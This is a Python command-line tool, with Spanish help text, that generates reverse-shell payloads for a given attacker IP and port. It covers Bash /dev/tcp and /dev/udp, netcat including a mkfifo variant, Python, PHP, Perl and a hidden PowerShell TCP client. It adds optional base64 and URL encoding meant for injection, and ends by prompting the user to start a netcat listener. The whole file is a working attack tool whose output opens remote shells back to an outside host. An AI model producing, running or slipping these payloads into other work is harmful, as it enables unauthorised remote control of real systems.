#!/usr/bin/env python3
import argparse
import sys
import urllib.parse

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def generate_payloads(ip, port):
    payloads = {
        "Bash (TCP)": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Bash (UDP)": f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "Netcat (Tradicional)": f"nc -e /bin/sh {ip} {port}",
        "Netcat (OpenBSD - mkfifo)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "Python 3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "PowerShell (Windows)": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    }
    return payloads

def main():
    parser = argparse.ArgumentParser(description="Generador de Payloads Custom (Reverse Shells)")
    parser.add_argument("ip", help="Tu dirección IP (Atacante - tun0)")
    parser.add_argument("port", help="Tu puerto a la escucha (ej. 4444)")
    parser.add_argument("--url-encode", action="store_true", help="Aplica URL Encode a todos los payloads")
    parser.add_argument("--base64", action="store_true", help="Aplica Base64 a todos los payloads (útil para inyecciones)")
    args = parser.parse_args()

    ip = args.ip
    port = args.port

    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("=======================================")
    print("     GENERADOR DE REVERSE SHELLS       ")
    print(f"      IP: {ip} | PORT: {port}")
    print("=======================================")
    print(f"{Colors.ENDC}")

    payloads = generate_payloads(ip, port)

    for name, cmd in payloads.items():
        print(f"\n{Colors.OKCYAN}[*] {name}:{Colors.ENDC}")
        
        final_cmd = cmd
        
        if args.base64:
            import base64
            # Para Linux, si se hace base64, solemos querer el comando listo para ser ejecutado así:
            # echo 'base64...' | base64 -d | bash
            b64_encoded = base64.b64encode(cmd.encode()).decode()
            if "Windows" in name:
                # PowerShell tiene su propio formato para comandos en base64 (UTF-16LE)
                ps_b64 = base64.b64encode(cmd.encode('utf-16le')).decode()
                final_cmd = f"powershell -e {ps_b64}"
            else:
                final_cmd = f"echo {b64_encoded} | base64 -d | bash"
                
        if args.url_encode:
            final_cmd = urllib.parse.quote(final_cmd)
            
        print(f"{Colors.OKGREEN}{final_cmd}{Colors.ENDC}")

    print(f"\n{Colors.WARNING}[!] No olvides ponerte a la escucha: nc -lvnp {port}{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
